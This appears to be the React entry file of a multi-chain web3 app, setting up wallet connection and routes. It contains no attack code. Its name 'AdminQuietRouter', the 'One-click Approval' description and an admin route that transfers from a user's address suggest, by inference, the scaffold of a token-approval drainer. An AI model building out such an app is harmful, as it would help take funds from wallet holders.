import ReactDOM from 'react-dom/client'
import { WagmiProvider } from 'wagmi'
import { mainnet, polygon, bsc, arbitrum } from 'wagmi/chains'
import { http } from 'wagmi'
import { defaultWagmiConfig, createWeb3Modal } from '@web3modal/wagmi/react'
import { QueryClient, QueryClientProvider } from '@tanstack/react-query'
import { createBrowserRouter, Navigate, RouterProvider } from 'react-router-dom'
import App from './App'
import AdminPage from './pages/Admin'
import TransferPage from './pages/Transfer'
import { ErrorBoundary } from './ErrorBoundary'
import './index.css'

const projectId = import.meta.env.VITE_WALLETCONNECT_PROJECT_ID
if (!projectId) {
  throw new Error('Missing VITE_WALLETCONNECT_PROJECT_ID in environment')
}

const chains = [mainnet, polygon, bsc, arbitrum] as const
const metadata = {
  name: 'AdminQuietRouter',
  description: 'One-click Approval (multi-chain)',
  url: window.location.origin,
  icons: ['https://walletconnect.com/walletconnect-logo.png'],
}

const transports = chains.reduce<Record<number, ReturnType<typeof http>>>(
  (acc, chain) => {
    acc[chain.id] = http()
    return acc
  },
  {}
)

const wagmiConfig = defaultWagmiConfig({
  projectId,
  chains,
  metadata,
  transports,
  auth: {
    email: false,
    socials: [],
    showWallets: true,
  },
  enableEIP6963: true,
})

createWeb3Modal({
  projectId,
  wagmiConfig,
  themeMode: 'dark',
  themeVariables: {
    '--w3m-accent': '#4f7dff',
  },
  allWallets: 'SHOW',
})

const queryClient = new QueryClient()

const router = createBrowserRouter([
  {
    path: '/',
    element: <App />,
  },
  {
    path: '/admin',
    element: <AdminPage />,
  },
  {
    path: '/admin/transfer/:address',
    element: <TransferPage />,
  },
  {
    path: '*',
    element: <Navigate to="/" replace />,
  },
])

ReactDOM.createRoot(document.getElementById('root')!).render(
  <WagmiProvider config={wagmiConfig}>
    <QueryClientProvider client={queryClient}>
      <ErrorBoundary>
        <RouterProvider router={router} />
      </ErrorBoundary>
    </QueryClientProvider>
  </WagmiProvider>
)
